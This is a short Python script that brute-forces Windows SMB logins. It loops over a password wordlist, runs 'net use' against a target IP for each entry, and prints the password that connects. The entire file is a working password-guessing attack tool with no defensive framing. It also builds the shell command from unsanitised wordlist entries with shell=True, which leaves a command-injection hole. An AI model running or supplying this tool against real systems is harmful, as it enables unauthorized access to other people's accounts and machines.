import os
import subprocess

def main():
    ip = input("Enter IP Address: ")
    user = input("Enter Username: ")
    wordlist = input("Enter Password List: ")

    count = 1

    try:
        # Open the password list file
        with open(wordlist, 'r') as file:
            for line in file:
                pass_ = line.strip()  # Remove any leading/trailing whitespace
                attempt(ip, user, pass_, count)
                count += 1
    except FileNotFoundError:
        print("Password list file not found.")
    except Exception as e:
        print(f"An error occurred: {e}")

    print("Password not Found :(")
    input("Press Enter to exit...")

def attempt(ip, user, pass_, count):
    # Execute the net use command and suppress the output
    command = f"net use \\\\{ip} /user:{user} {pass_}"
    print(f"[ATTEMPT {count}] [{pass_}]")

    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Check the result of the command
    if result.returncode == 0:  # Command was successful
        success(ip, pass_)

def success(ip, pass_):
    print()
    print(f"Password Found! {pass_}")
    # Clean up the connection
    cleanup_command = f"net use \\\\{ip} /d /y"
    os.system(cleanup_command)
    input("Press Enter to exit...")

if __name__ == "__main__":
    main()
